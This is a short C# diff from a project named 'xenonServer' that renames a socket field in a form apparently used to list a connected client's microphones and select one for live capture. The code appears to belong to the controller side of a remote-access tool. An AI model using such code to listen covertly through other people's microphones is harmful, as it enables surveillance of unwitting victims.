@@ -77,7 +77,7 @@ namespace xenonServer.Forms
             if (id != -1)
             {
                 await Utils.Type2returnAsync(SubSubNode);
-                byte[] a = SubSubNode.sock.IntToBytes(id);
+                byte[] a = SubSubNode.Sock.IntToBytes(id);
                 await client.SendAsync(a);
                 byte[] found = await client.ReceiveAsync();
                 if (found == null || found[0] == 0)
@@ -113,7 +113,7 @@ namespace xenonServer.Forms
         {
             byte[] opcode = new byte[] { 1 };
             await client.SendAsync(opcode);
-            int mics = client.sock.BytesToInt(await client.ReceiveAsync());
+            int mics = client.Sock.BytesToInt(await client.ReceiveAsync());
             string[] result = new string[mics];
             for (int i = 0; i<mics; i++) 
             {
@@ -126,7 +126,7 @@ namespace xenonServer.Forms
         {
             byte[] opcode = new byte[] { 2 };
             await client.SendAsync(opcode);
-            await client.SendAsync(client.sock.IntToBytes(index));
+            await client.SendAsync(client.Sock.IntToBytes(index));
         }
         private void Live_Microphone_Load(object sender, EventArgs e)
         {
